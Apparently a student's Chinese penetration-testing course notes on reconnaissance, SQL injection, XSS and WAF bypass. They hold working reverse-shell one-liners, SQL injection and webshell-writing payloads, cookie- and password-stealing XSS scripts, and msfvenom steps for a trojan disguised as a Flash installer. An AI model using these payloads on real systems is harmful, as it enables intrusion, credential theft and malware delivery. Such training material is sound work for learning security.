# 一、概述



加盐、论坛找个案例讲

## 1、名词解释

~~~shell
# 什么是渗透
模拟黑客的恶意的攻击方法，对安全进行评估
渗透的过程中不能影响正常使用
# 名词解释
1、POC（Proof of Concept）：概念验证，常指一段漏洞证明的代码
2、EXP（Exploit）： 漏洞利用
3、payload ：id，whoami（执行）
4、肉鸡 ：可以随意控制
5、后门/webshell：黑客为了对主机进行长期空置，留的一个入口
6、木马：看起来正常，实际运行起来之后可以获得系统的整个控制权限
7、漏洞：可能被攻击者利用的地方
8、提权：
9、跳板：隐藏身份
10、黑白盒测试、
11、反弹、
12、c段入侵、
13、旁站入侵:
14、暴力破解:
15、蜜罐
16、SEO（Search Engine Optimization）：搜索引擎优化
17、wordpress网站构建器
18、thinkphp：企业级轻量级php框架
19、API(application progranmming interface)：应用程序编程接口
# 其它
1、ATT&CK：写报告参考的名词
cnblogs.com
2、payload模块：
在Metasploit Framework 6大模块中有一个Payload模块，在该模块下有Single、Stager、Stages这三种类型，Single是一个all-in-one的Payload，不依赖其他的文件，所以它的体积会比较大，Stager主要用于当目标计算机的内存有限时，可以先传输一个较小的Stager用于建立连接，Stages指利用Stager建立的连接下载后续的Payload。Stager和Stages都有多种类型，适用于不同场景。
3、名词解释：
https://www.cnblogs.com/sunny11/p/13583083.html
4、补天
5、先知社区
#常用的软件
1、抓包
	burp
	fiddler
2、模拟器
	夜神模拟器：设置网络-->安装证书（burp.cer/fidder.der）
3、代理
	charles
	proxifier
4、CMS识别
5、插件
	findsomething
6、小工具
	beryengama：字符转换
7、GPT
8、解密网站
	cmd5、somd5
9、seekmap
10、资产和信息收集软件
灯塔：arl.ixxzhi.cn
adimin;BT7274
~~~

### 常用扫漏软件

~~~shell
# Xray；是一款功能强大的安全评估工具；
1、XSS漏洞检测 (key: xss)
2、SQL 注入检测 (key: sqldet)
3、命令/代码注入检测 (key: cmd-injection)
4、目录枚举 (key: dirscan)
5、路径穿越检测 (key: path-traversal)
6、XML 实体注入检测 (key: xxe)
7、文件上传检测 (key: upload)
8、弱口令检测 (key: brute-force)
9、jsonp 检测 (key: jsonp)
10、ssrf 检测 (key: ssrf)
11、基线检查 (key: baseline)
12、任意跳转检测 (key: redirect)
13、CRLF 注入 (key: crlf-injection)
	CRLF的含义是“carriage return/line feed”，意思就是回车。这是两个ASCII字符，分别排在第十三和第十位。CR和LF是在计算机终端还是电传打印机的时候遗留下来的东西。电传打字机就像普通打字机一样工作。在每一行的末端，CR命令让打印头回到左边。LF命令让纸前进一行。虽然使用卷纸的终端时代已经过去了，但是，CR和LF命令依然存在，许多应用程序和网络协议仍使用这些命令作为分隔符。
14、Struts2 系列漏洞检测 (高级版，key: struts)
15、Thinkphp系列漏洞检测 (高级版，key: thinkphp)
16、POC 框架 (key: phantasm)

# AWvs：
（Acunetix Web Vulnerability Scanner）用于测试和管理Web应用程序安全性的平台，能够自动扫描互联网或者本地局域网中是否存在漏洞，并报告漏洞。
AWVS可以通过检查SQL注入攻击漏洞、XSS跨站脚本攻击漏洞等漏洞来审核Web应用程序的安全性。
# Appsan；
AppScan是IBM的一款web安全扫描工具，可以利用爬虫技术进行网站安全渗透测试，根据网站入口自动对网页链接进行安全扫描，扫描之后会提供扫描报告和修复建议等。
~~~



## 3、Kali工具

~~~shell
功能点？
# 扫描端口
1、Nmap -sV -Pn -A
	nmap -p-
-sV 探测端口服务版本
-A 全面系统检测，启用脚本检测、扫描等
-Pn 扫描之前不需要ping命令
# 扫描目录
1、dirb http://IP
# 扫描sqlmap（具体的在文档搜索）
1、sqlmap -u “URL”
# 扫描漏洞（框架漏洞）hell
1、反弹shell
2、/etc/passwd 里拿密码，或者有用户名进行爆破
3、注入木马（使用软件进行控制）
4、让网站下载自己的文件-->加权限可以执行-->执行（自己开服务器进行监听）
# phpinfo()都有什么信息？

# wpscan 找到用户名（wps框架）
	wpscan -h
# 已知用户名，爆破ssh密码
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://IP
hydra -h
1、hydra：九头蛇工具
	hydra（九头蛇）是著名黑客组织thc的一款开源的暴力破解密码工具，功能非常强大，kali下是默认安装的，几乎支持所有协议的在线破解。密码能否破解，在于字典是否强大。
# 词典路径：
/usr/share/wordlists

# 系统漏洞工具：metasploit(MSF，The Metasploit Framework，非常全面，整个渗透过程都可以用它)
1、metasploit：ruby语言编写
	目录：/usr/share/metasploit-framwork-->modules
2、msfconsole
	msf6-->search msl/010
	use (编号)0
	option/info
	run/exploit
	(help可以看命令)
	// chcp 65001 ：改编码，不乱码
（2）sessions
		set session 1（set lport 1111）
3、重新加载：reload_all
# 微软：ms开头，其它的是cve，.rb结尾（目录下面可以自己添加）
# 
~~~



## 2、渗透流程

* 1、明确目标
* 2、信息收集
* 3、漏洞探测
* 4、漏洞验证
* 5、信息分析
* 6、获取所需
* 7、信息整理
* 8、形成报告

## 3、反弹shell、文件下载

1、windows

* 棱角社区：用来查询语句

[[~\]#棱角 ::Edge.Forum* (ywhack.com)](https://forum.ywhack.com/bountytips.php?download)

powershell：用linux语句操作

* netcat下载：nc

https://eternallybored.org/misc/netcat/

* 老师的靶机

http://172.168.20.40:8005

2、linux

下载命令：wget、curl、python

~~~shell
# 搭建网站：
	python -m http.server
# 文件下载
certutil.exe -urlcache -split -f http://IP：端口/文件名
# 反弹shell
1、windows下载：nc/netcat（反弹shell回显）
2、linux监听：nc -lvvp 8888
2、win：nc64.exe -e cmd IP port
echo "bash -i >& /dev/tcp/127.0.0.1/8080 0>&1" | bash
# 正向shell
1、windows监听：nc -lvvp 8888
2、kali：mc -e /bin/sh IP port
##python开启一个新终端：搭建一个半交互式的反弹shell：
	python -c 'import pty:pty.spawn("/bin/bash")'
	ctrl + z（挂后台运行）
	stty raw -echo（重置stty，意味着你看不到输入的内容）
	fg（调回前台）...
# 反弹shell的类型
1、非交互式：非交互式反弹shell没有上下文。
	使用history，看是否又输出，非交互式是没有输出的。（nc、bash不加i）
2、半交互式：有一定的上下文（bash -i）
	history有输出，top命令无输出
3、交互式：引入伪终端pty。之前的两种情况bash的输入输出要么链接着管道，要么链接着socket，但是伪终端生成的反弹shell，输入输出和正常情况一样。
# 链接：https://cloud.tencent.com/developer/article/1645464
~~~



## 4、HTTP报文

host：目标

refer：从哪里来

~~~shell
1、数据包组成
	请求行、请求头标、空行、请求数据
2、请求方式（8种）
	get
	post
	head
	put
	trace
	delete
	option
	connect
# get和post的区别
get提交的数据大小有限制，而post方法提交的数据没有限制。
get会出现安全问题
# 响应状态码介绍
1xx：指示信息-表示请求已接收、继续处理
2xx：成功-表示请求已经被成功接收、理解
3xx：重定向-要完成请求必须进行更进一步的操作
4xx：客户端错误-请求有语法错误或请求无法实现
5xx：服务端错误-服务器未能实现合法的请求
~~~

# 二、信息收集（打点）

* 开发语言：php、asp、aspx、jsp、java、python
* 程序源码：根据开发语言分类、开源CMS、开发框架分类
  * 框架：随便加路径（如：thinkphp）
* 中间件容器：IIS、Apache、Nginx、Tomcat(8080、8005、8009)、JBoos(8080)、glasshfish(4848)
* 数据库类型：
  * Access(445)、Mysql(3306)、Mssql(1433、sa)、Oracle(1521)、postgreSQL(5432)、DB、Sybase、Redis(6379、default)、MongDB(27017)、weblogic(7001、weblogic)、Tomcat(tomcat)

* 端口：
* 服务器操作系统：
  * 大小写(Linux对大小写敏感)、ttl
* 第三方软件等：phpmyadmin、ys-ftpd、VND、ELK、Openssh

## 一、web资产信息收集

### 1、web基本架构

~~~shell
# 开发语言：
php、asp、aspx、jsp、java、python
# 程序源码：
根据开发语言分类、开源CMS、开发框架分类
	框架：随便加路径（如：thinkphp）
# 中间件容器：
IIS、Apache、Nginx、Tomcat、JBoos、glasshfish(4848)
# 数据库类型：
Access(445)、Mysql(3306)、Mssql(1433)、Oracle(1521)、postgreSQL(5432)、DB、Sybase、Redis(6379)、MongDB(27017)
# 服务器操作系统：
	大小写(Linux对大小写敏感)、ttl
# 第三方软件等：phpmyadmin、ys-ftpd、VND、ELK、Openssh
~~~

收集方法：

~~~shell
通过header头部信息收集
通过目录收集
通过端口收集
通过cms收集
通过第三方搜索引擎收集
~~~

### 2、子域名信息收集

~~~shell
###
企业信息：whois查询
* 查找同企业下其它域名：站长之家 /Godaddy /icp备案查询网 /天眼查 /爱企查
* icp备案查询网：网站备案号

#软件
* 第三方软件：fofa
* 下载软件oneforall（github）：扫描子域名
* layer子域名扫描

#常用网站
1、https://www.bebscan.cc
# 旁站往往存在业务功能站点，先收集已有ip的旁站，再探测C段，再在c段的基础上再收集一次旁站。
2、C段信息收集：
www.webscan.cc
	c.webscan.cc
fofa.info
3、好用的网址：tools.yum6.cn
~~~

google hacking语法

~~~shell
# 1、跟这个网站有关的所有URL：
	site：haut.edu.cn
# 2、筛选网络标题
	intitle：河南工业大学
# 3、搜索有特定字符的
	inurl：haut
	inurl:/dede/
	inurl:index.php tw（台湾）
# 4、在网页正文内容中的指定字符
	intext：haut
# 5、所有和网站做了链接的URL
	link:haut.com
# 6、搜索指定类型的文件
	filetype：txt
~~~



### 3、旁站和c段信息收集

~~~shell
#旁站往往存在业务功能站点，建议先收集已有IP的旁站，再探测C段，确认C段目标后，再在C
段的基础上再收集一次旁站。
旁站在线查询：https://www.webscan.cc/
C段在线查询：https://c.webscan.cc/
FOFA：https://fofa.info/
~~~

### 4、目录和敏感文件扫描

~~~shell
#可以获得网站的后台管理页面、文件上传页面、甚至可以扫描出网站的源代码
# 工具
7kbscan
  dirsearch
dirbustr
  dirb：kali
~~~

### 5、CMS识别（content management system)

又称整站系统或文章系统。有了CMS网站就不需要靠手工维护，只需要一个软件包就可以配置好。

  （1）常见的CMS系统

常见的CMS系统有wordpress、drupal、joomla、xoops等

  （2）识别方法：

* whatweb：http://whatweb.bugscaner.com/look/
  * kali：语句：whatweb https://www,ctocio,com/
* 御剑cms识别
  * 插件：wappalyzer
* 软件：zenmap、scaninfo

### 6、判断网站中间件等信息

~~~shell
通过headers头部来判断
一些在线网站识别：http://whatweb.bugscaner.com/look/
插件识别：Wappalyzer
~~~

### 7、端口扫描

~~~shell
御剑
Nmap
scaninfo
#通过端口知道服务-->glassfish-->不同版本的漏洞-->任意文件读取
~~~



## 二、CDN绕过

content deliver network，内容发布网站。解决访问量大而导致网络速度性能低下的问题

1、判断是否存在CDN

* ping：站长工具

* cmd：nslookup（看有几个地址）

2、绕过CDN的方法

~~~shell
绕过CDN的方法
1、查询子域名
2、国外偏僻的ip访问（没有CDN）
3、历史解析记录（查找之前它的ip地址）
	 站长工具
4、查看邮件地址
	忘记密码诱导发邮寄
4、通过小程序、app（因为流量小）
5、接口查询：
	get-site-ip 
	ip138搜备案
6、搜索图标
	搜索图标：源代码-->找图标-->第三方软件导入
7、通过一些敏感文件
	1491.com.tw/phpinfo.php
8、用流量把服务器打崩就可以直接找到主服务器
  tools论坛
9、去掉WWW试一试

#常用的SRC
1、hunter.qianxin.com(提示有语法)
2、quake.360.net
3、zoomeye 网站
4、shodan.io
5、零零信安（第三方资产收集网站）
6、GitHub
~~~



## 三、信息泄露收集

~~~shell
#
1、Github
2、google语法：site:edo.cn 身份证 xls
3、网盘的信息泄露
	reg007
	tg机器人（telegram-bot）
4、网站的JS信息泄露
	网站的路径
		手动：开发者模式
		软件：github-->JFfinder:用来快速提取检测页面中JS与URL的工具	
			findsomething、
#一些敏感文件泄露
1、git信息泄露：
访问xxx/.git 文件 403或存在即可尝试获取源码
	inurl:/.git
	https://github.com/BugScanTeam/GitHack
2、svn信息泄露：访问xxx/.svn/entries 内容存在即可尝试获取源码
	inurl:/.svn/entries
	https://github.com/callmefeifei/SvnHack
	https://blog.csdn.net/wuxinweii/article/details/123099063
3、DS_Store泄露: 该文件为mac下的数据文件，访问存在即可尝试获取源码
	inurl:/.DS_Store
	https://github.com/lijiejie/ds_store_exp
4、php特性配置说明文件composer.json泄露: 访问composer.json存在即可尝试获取源码相关信息
	inurl:/composer.json
# Git和SVN都是版本管理系统
~~~

​	

## 四、OWASP

OWASP，又称为 “开放Web应用程序安全项目”。它致力于创造一个更安全的网络应用环境。它免费提供文章、工具、技术和论坛，让每个开发人员都能创建安全的代码。其最著名的项目之一是 OWASP Top 10。

### OWASP top 10

根据开放 Web 应用程序安全项目公开共享的 10 个最关键的 Web 应用程序安全漏洞列表。根据 OWASP，漏洞是应用程序中的一个弱点，它允许恶意方对应用程序的利益相关者（所有者、用户等）造成伤害。

OWASP Top 10 列表由全球 Web 应用程序安全专家开发并定期更新。它旨在教育公司了解他们需要缓解以保护其 Web 应用程序的漏洞和关键安全风险。

１、注入攻击

２、破解认证

３、敏感数据暴露

４、ＸＭＬ外部实体

５、破坏访问控制

６、安全配置错误

７、跨站脚本ＸＳＳ

８、不安全的反序列化

９、使用已知漏洞的组件

１０、日志记录和监控不足

## 五、WAF绕过（web application firewall）

~~~shell
#绕过方法
1.从架构层面：找到服务器真实IP，同网段绕过，http
和https同时开放服务绕过，边缘资产漏洞利用绕过。
2.从协议层面：分块延时传输，利用pipline绕过，利用
协议未覆盖绕过，POST及GET提交绕过。
3.从规则层面：编码绕过，等价符号替换绕过，普通注
释和内敛注释，缓冲区溢出，mysql黑魔法，白名单及
静态资源绕过，文件格式绕过，参数污染。
~~~



# 护网log

## 1、攻击方式

* web入侵
* 系统入侵
* 病毒
* 数据库入侵

## 2、攻击阶段

* 1、侦察
  * 端口扫描、漏洞扫描、搜索引擎、地址、中间件等
* 2、改装武器
  * POC工具、改造恶意文件、病毒、蠕虫、木马
* 3、交货
  * 邮件、结合木马
* 4、利用

## 3、攻陷阶段

* 安装

  * 安装木马、植入后门、上传webshell

* 命令和控制

  * C&C、远程登陆、系统提权、webshell

* 在目标行动

  * 窃取、破坏、篡改、利用

  

  ## 攻击类型8种

  1、web攻击：sql注入、重定向、上传文件攻击、Dos攻击、跨站点请求伪造(CSRF)、XSS攻击

  2、弱密码

  3、互联网边界渗透

  3、0day攻击

  4、供应链攻击

  5、供应链攻击

  6、相关单位攻击

  7、多点潜伏

  8、社工钓鱼

## 重点内网系统

1、OA 办公自动化

* 泛微weaver
* 织信informat
* 致远互联
* 蓝凌Landray
* 华天动力

2、ERP 企业资源计划

3、重要信息节点

4、web中间件

5、编程语言

6、数据库

# 三、Sql注入

对用户输入的数据合理性没有过滤或者是判断。/query.php?user=admin

注入的危害：

* 数据泄露（爆库）
* 网页篡改
* 数据库被恶意篡改
* 服务器被远程控制
* 种植木马（拿shell）

探测方法：

~~~shell
1、首先要能够传参
2、看页面：user、id、cid
	？后面是参数
	&连接其它参数
3、判断是整型还是字符型注入
	加入一些字符：【‘】【“】，如果是字符型就会允许符号【“】。
4、？user=admin' and '2'='2
	注释掉后面的字符：（--空格-/--+）（#）
	？user=admin' and '2'='3
5、参数未知：
	？user=11' or 1=2-- -
#插件：hackbar
#怎么看有没有反弹：看连接
~~~

注入类型：

## 1、联合查询注入

~~~shell
172.168.20.40:8001/query.php?user=
http://172.168.20.40:8101/
8003
# 联合查询注入：
#1、字段数：
	？user=admin' order by 1 -- -
2、判断回显的字段
	？user=admin' union select name1，name2-- -
3、爆库名
	admin' union select database() -- -
4、爆表名
	* admin' union select (select table_name from information_schema.tables where table_schema='库名' limit 0,1) -- -
5、爆字段
	admin' union select (select column_name from information_schema.columns where table_schema='库名' and table_name='表名' limit 0,1) -- -
6、查需要的信息
	admin' union select (select group_concat(id,name,';',pass) from admins) -- -
# 内置函数
select database()
			 version
			 current_user
			 数据库路径：@@datadir
			 数据库安装路径：@@basedir
# information_schema 5.0版本以后才内置（无法删除）
所有的数据库名 schemata-->schema_name 
所有的表名 tables-->table_name
存储了所有的字段名 columns-->column_name

# 拼接：
	admin' union select group_concat(column_name) from information_schema.columns where table_schema='grade' and table_name='admins' limit 0,1-- -
	; or 0x3a

案例：
listid=-7 union select 1,2,3,4,5,6,7
select table_name from information_schema.columns where table_schema='test' limit 0,1
(select table_name from information_schema.columns where table_schema='test' limit 0,1)
510cms
510_admin
id,mid,name,passwd,remark

login.php
admin

#问题
1、显示不变
id=-1

~~~



## 2、报错注入

~~~shell
172.168.20.40:8003/Less-1/?id=1
#过程
1、判断是否可以注入
2、使用报错注入:先让报错再加进去
(1)extractvalue
	extractvalue(1,'~')
	extractvalue(1,concat('~','111','222',database()))
(2)updatexml(1,'',1)
(3)exp()
(4)floor()
#实例
?id=1' and extractvalue(1,'~')
~~~



![image-20230407153225772](攻防基础.assets/image-20230407153225772.png)



## 3、布尔盲注

没有报错也没有回显，只能一个一个试

~~~shell
http://172.168.20.40:8101/product.php?cid=3
#思路：判断是否正确；先判断正确的反应和错误的反应
1、手动
and length(database())>=5
and substr('abc',2,1)='b'
2、burp
3、密码大小写不区分的解决方法：转换
sniper 1

# 搭建环境
1、安装phpmyadmin
2、把网站放在www文件夹下
3、导入数据库
4、改变配置文件：密码设成root（query.php\conn.php\db-crate）

#语句
?G0=4 and ascii(substr(database(),1,1))=119 -- -
#可以转换成16进制，也可以转换成ascii码
~~~



## 4、时间盲注

既不会回显数据，也不会回显错误信息，也不提示真假

~~~shell
# 思路：通过页面的响应时长(开发者模式-->网络-->时间)
# 语句：
（1）sleep
  id=1 and sleep(5) -- -
	id=1' and if(length(database())>=8, sleep(5),1)
	id=1' and if(substr(database(),1,1)>=8, sleep(5),1)
（2）if()
#burp
1、设置变量
2、变量设置1-127
3、设置线程
4、显示response received
# 可以用burp转换格式（url-encode as you type ）
~~~



## 5、堆叠注入（mysql_muti...）

* 用；来表示语句的结束

条件：

1、用的是mysql_muti_query

2、使用PDO预编译并且没有过滤

## 6、二次注入 (白盒)

先存储在数据库里面再执行

~~~shell
# 语句
1、创建用户：admin'#
# 要看代码
1、注入
2、burp
3、在y找代码
	追踪函数-->追踪
# lmxcms：
1、查看代码：echo %sql(151)
2、数据包：name=1...setbook=111&time)values('1','2','3','4','5','6')#=111
3、更改值，使得回显
#
chat.openai.com/chat
admin.php?m=Login
~~~



## 7、宽字节注入（gdk）

基于gdk编码一个gbk汉字占两个字节。第一个字节（129-254），第二个字节（64-225）

%dd  ；  %dc

~~~shell
# 语句
http://172.168.20.84:8088/Less-32/?id=1%dc' and updatexml(1,concat(0x7e,database(),0x7e),1) -- -
~~~



## 8、header头部注入

有输入还要能拼接

1、cookie（因为没有过滤）

2、user-agent

~~~php
#php文件-->www文件夹
<?php
  $a=$_GET['a'];
  echo $a;
  ?>
# 改变GET：POST/COOKIE
# 数据包：
    user-Agent：Mozilla',1,2)#
~~~



## 高权限读写操作

条件：

* 需要用户有读写权限
* 需要知道网站的绝对路径：报错、猜测（@@datadir）
* secure_file_priv=""需要配置（myini）

常用函数：

~~~shell
# 语法
1、写：into outfile（写在最后）
	union select 1,'',3 INTO outfile "D:\\phpStudy\\PHPTutorial\\WWW\\shell.php"--+
2、读：load_file（写在回显的位置）
	union select 1,load_file('D:\\phpStudy\\PHPTutorial\\WWW\\index.php'),3 --+
# shell
<?php phpinfo();?>(是否需要加引号)
# 有时候需要两个\\
#网站：
dnslog.cn
ceye.io
zoomeye
### secure_file_priv
secure_file_priv 这个变量被用于限制导入和导出的数据目录，比如 LOAD DATA 和 SELECT ... INTO OUTFILE 语句，以及 LOAD_FILE() 函数。这些操作限制了哪些用户拥有文件操作权限。
* secure_file_priv有些设置选项:
 1、如果为空，不做目录限制，即任何目录均可以。
 2、如果指定了目录，MySQL 会限制只能从该目录导入、或导出到该目录。目录必须已存在，MySQL 不会自动创建该目录。
 3、如果设置为 NULL，MySQL 服务器禁止导入与导出功能。
~~~

## DNSlog外带sql查询的记录

条件：需要mysql的文件my.ini添加或者修改：secure_file_priv=""

~~~shell
# 条件
使用本函数有几个前提：
1、首先要有注入点
2、需要有root权限
3、数据库有读写权限即：secure_file_priv=“”
4、得有请求url权限
5、还必须得是windows服务器
# 语句：
http://192.168.43.113//sqli-labs/Less-8/?id=1' and load_file(concat("\\\\",version(),".yn3pf3.dnslog.cn\\yyy")) -- -

# 网站：
dnslog.cn
ceye.io
zoomeye
### dnslog注入的原理
DNSlog就是DNS的日志，DNS在域名解析的时候会留下域名和解析IP的记录。DNS在解析的时候会留下日志，我们将信息放在高级域名中，传递到自己这里，然后通过读日志获取信息。
这里要用到load_file,而load_file无法直接使用，需要用concat，而访问互联网上的文件需要用到//
# //
访问互联网中的文件时，需要在最前面加上两个斜杠 //
~~~

## SQL注入绕过

~~~shell
1、注释绕过：/*!xxx*/
2、大小写绕过
3、双写绕过：selectselect * from...
4、编码绕过
	ascii码
	十六进制
	unicode编码
	URL编码（双重URL编码）
5、空格过滤绕过
	/**/
	换行：%0a
	tab(四个空格)：%09
6、or或者and绕过：&&；||；！
7、等号绕过：
	like；
	rlike(模糊匹配)；
	regexp；
	id>'admin1' and id<'admin3';
	<>等价于！=，<>！就是等号
8、大于小于符号绕过
	greatest(n1,n2,n3)返回里面最大值
	substr('abc',1,1) in ('a')：返回真假	
9、逗号过滤
	limit 0，1-->limit 0 offset 1;
10、等价函数替换
	sleep-->benchmark
	ascii-->hex
	group_concat-->concat_ws
11、过滤单引号：宽字节

#举例：
id=1'%09and%09updatexml(1,concat(0x7e,database(),0x7e),1)%09or%09'1'='1
# 思路
若是and-->And?-->anandd?
order里面有or，所以无法用
~~~

### sql注入常见的防御方法有哪些

~~~shell
1、分级管理
2、参数传值
3、基础过滤与二次过滤
4、使用安全参数
5、漏洞扫描
6、多层验证
7、数据库信息加密
~~~



fastTunnel

### sqlmap

~~~shell
sqlmap -h：sqlmap.highlight.ink
# get
sqlmap -u “URL” -p id 【-v 3:详情】【--batch：默认填充】
# post
sqlmap -u “URL” --form:找表单 --batch
sqlmap -u “URL” --data=uname=passwd=subimt --batch
-r：文件
--level：默认5级，数字越低越仔细
###爆库
sqlmap -u "URL" --dbs/--tables/--columns
sqlmap -u "URL" -D security -T admin --dump
###
sqlmap -u "URL" --level=5 --risk=3
--file-read"c:/test.txt"
# shell
--os-shell
--sql-shell
# sql转义
sqlmap --tamper="space2comment.py,space2plus.py"
# 路径
sqlmap --tamper="space2comment.py,space2plus.py"

### os-shell
对于mysql数据库来说，--os-shell的本质就是写入两个php文件，其中的tmpugvzq.php可以让我们上传文件到网站路径下；然后sqlmap就会通过上面这个php上传一个用于命令执行的tmpbylqf.php到网站路径下，让我们命令执行，并将输出的内容返回sqlmap端。
# 参数
-h 参数查看以及用法
--data抓取其post提交的数据填入
--random-agent 使用任意的user-Agent爆破
--cookie"抓取的cookie"
~~~



## 其它数据库注入

靶场：墨者学院

### Access

* 没有库，只有表

* 暴力破解

* ~~~shell
  #语句
  ?id=5 union select 1,2,3,4 from admin
  #注入
  ?id=5 and exists(select count(*) from admin)
  #参考
  https://blog.csdn.net/qq_57307348/article/details/122904162
  ~~~

### sql-server（1433）

* 1、权限
  * sa权限：123456
  * db权限：
  * public权限：
* 2、自带库、表
  * sysobjects：id、name、xtype
* 3、语法

~~~shell
#注入
id=2 order by 4
id=-2 union all select null,2,'3',null （判断是字符，还是整型）
#语句
select @@version;
select db_name;
select user;
~~~

### postgreSQL（5432）

* 1、权限
  * postgres（pw：postgres）

~~~shell
#注入
id=-1 union select null,'2','3',null
id=-1 union select null,(select current_database()),'3',null（数据库）
id=-1 union select null,'2',relname,null from pg_stat_user_tables limit 1 offset 0(表)
# 参考
https://blog.csdn.net/qq_51295677/article/details/125641760
~~~

### Oracle（1521）

* dual是一个虚拟的表，oracle保证dual永远只有一条信息

~~~shell
#注入
id=1 order by 2;
id=-1 union select '1',null from dual;
id=-1 union select null,(select table_name from user_tables where rownum=1 and table_name<>'LOGMNR_SESSION_EVOLVE$') from dual;
# 因为在Oracle数据库中的select查询语句必须跟上查询列表，所以在union后面的select查询语句我们必须跟上from dual ，dual表是Oracle数据库中自带的虚拟表，可当万能用
# 参考
https://blog.csdn.net/weixin_48141183/article/details/121120365
~~~

### sqllite



### DB2

~~~shell
# 参考
https://blog.csdn.net/qq_39936434/article/details/95493242
~~~

### MongDB(27017)

~~~shell
# 参考
https://forum.butian.net/share/376
~~~

~~~shell
#寻找注入点
1、get、post、cookie等
2、扫目录
3、' ; " ; '); ' or sleep(5);  
4、工具
5、get：不同的参数试一试
6、post：搜索、注册（使用burp）
7、找后台：admin/login.php
8、找到了CMS等去找漏洞
’~‘=0x7e
###sqlmap，burp和sqlmap联用，数据包爆破
1、把burp包写成文档，直接在sqlmap里面扫描
2、github-->sqlmap4burp
语句：
sqlmap -r 1.txt -p user --batch --dbms=mysql
# head 头部注入
要接收
有没有拼接
# 软件
robotform
手机号接码平台
十分钟临时邮箱：smsjisu.com
~~~



# 四、XSS

XSS漏洞介绍：

	XSS全称跨站脚本(Cross Site Scripting)，为避免与层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS。这是一种将任意 Javascript 代码插入到其他Web用户⻚面里执行以达到攻击目的的漏洞。攻击者利用浏览器的动态展示数据功能，在HTML⻚面里嵌入恶意代码。当用户浏览改⻚时，这些潜入在HTML中的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击者的特殊目的，如cookie窃取等。
XSS产生原理：

~~~shell
形成XSS漏洞的主要原因是程序对输入和输出的控制不够严格，导致“精心构造”的脚本输入后，在输到前端时被浏览器当作有效代码解析执行从而产生危害。
~~~

XSS的危害

~~~shell
1. 网络钓⻥，包括获取各类用户账号
2. 窃取用户cookies资料，从而获取用户隐私信息
3. 劫持用户（浏览器）会话，从而执行任意操作
4. 强制弹出广告⻚面、刷流量等
5. 网⻚挂⻢
6. 结合其他漏洞，如csrf，实施进步危害
~~~

其它：

~~~shell
#浏览器不同会造成不同结果
# 条件
1、有输入输出
2、有回显
#xss常出现的地方
1、get、post、cookies、header
2、反馈与浏览
3、富文本编辑
4、各类标签插入和自定义
#数据输出的地方
1、用户资料
2、关键词、标签、说明
3、文件上传
#语句
<script>console.log(111111123)</script>
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<a href=javascript:alert(1)>
<details open ontoggle= confirm(document[`coo`+`kie`])>
javascript:alert(/xss/)
////   触发事件xss语句   ///
onmouseenter 当鼠标进入选取执行代码
	<div style="background-color:red" onmouseenter="alert('xss')">xss</div>
#测试网站
http://chanelco.co/
http://172.168.20.84/2.php?a=<script>alert(1)</script>
# 工具
xssstrike（git）
dalfox（git）
~~~

## 1、XSS类型

1、反射性

​	又称非持久型XSS，具有一次性，只在用户单击时才可以

​	常见出现的位置：

~~~shell
<a>123123</a>
<script>alert(1)</script>
1、看源代码
2、搜索
3、试标签
4、闭合
#在线短链接生成：
	reurl.cc
~~~

2、存储型

stored xss attacks，也是持久型xss。

~~~shell
# 常见出现的位置
留言板、论坛等
# 测试：图书管理页面
~~~

3、DOM型

不会提交给后端，直接前端处理，是抓不到包的

## 2、XSS利用

~~~shell
# XSS攻击利用XSS平台
1、XSS平台
	xss.yt写脚本
	xssaq.com
	自己搭建平台
2、手动测试
（1）cookie.php
<?php
$cookie = $_REQUEST['abc'];
file_put_contents('cookie.txt',$cookie);
?>
(2)payload
<script>document.location='http://100.100.100.26/cookie.php?cookie='+docume
nt.cookie</script>
# beef软件的安装（钩子：控制对方主机，进行一系列活动）
工具：beef-xss
安装：apt install beef-xss
apt remove beef-xss
# 语句
* <script src="http://172.168.20.84:3000/hook.js"></script>
* <script>document.location='http://172.168.20.166/cookie.php?abc'+document.cookie</scripts>
#作业：
http://172.168.20.40:99/
#cookie和session的区别：
1、对象不同：
cookie是针对每个网站的信息，每个网站只能对应一个，其它网站无法访问。
session是针对每个用户的，只有客户端才能访问。session将在用户访问结束后自动消失。
2、大小不同：
cookie不超过3K
session存储在服务器上。
3、安全性不同：
cookie不是很安全
~~~

### XSS钓鱼

~~~shell
# XSS钓鱼
1、生成一个木马(msf生成后门)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.168.20.17 LPORT=7777 -f exe > flash.exe
2、下载好正版安装包，并和木马打包压缩成exe文件（记得改变高级解压缩）
	解压到的路径：c:/windows/temp
	解压后运行的软件：c:/windows/temp/flash.exe
	c:/windows/temp/flashcenter_pp_ax_install_cn.exe
3、老师给的网站放在kali里，并开启python服务（记得修改里面的配置：IP地址）
	flash.js
	html
4、msf使用
	msfconsole
	use exploit/multi/handler 
	set payload windows/meterpreter/reverse_tcp
	set lhost 木马ip
	set lpot 木马端口
	options 查看
	run
5、写入脚本
<script src="http://172.168.20.219:8080/flash.js"></script>
~~~



### 表单劫持

~~~shell
1、抓包找路径
2、修改提交的文件，添加js语句
$xx='<script src=http://172.168.20.70/pass.php?na='.$id.'&pa='.$pass.'></script>';
echo $xx;
3、WWW下写pass.php文档（本地）
<?php
$name = $_REQUEST['na'];
$pass = $_REQUEST['pa'];
$a = "账号：".$name."密码：".$pass."||";
file_put_contents('pass.txt', $a, FILE_APPEND |LOCK_EX); 
?>
4、访问
# 挂马
# 防范：抓包（history）
~~~



### XSS常见绕过

~~~shell
1、大小写绕过、双写绕过
2、常见的XSS的绕过编码有JS编码
3、XSS黑名单绕过
不使用 " <input onfocus=alert('1') autofocus/>
不使用 ' <input onfocus="alert(/1/)" autofocus/>
不使用 () <input onfocus="alert`'1'`" autofocus/>
不适用 () ' " <input onfocus=alert `1` autofocus/>
使用html实体编码绕过
<input onfocus="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#49;&#39;&#41;" autofocus/>
使用html实体编码绕过变形
<input onfocus="&#97&#108&#101&#114&#116&#40&#39&#49&#39&#41" autofocus/>
onclick触发：
<div onclick="alert('xss')">
"onclick="alert(1)"
#防御
1、实体编码
2、http-only
3、sop
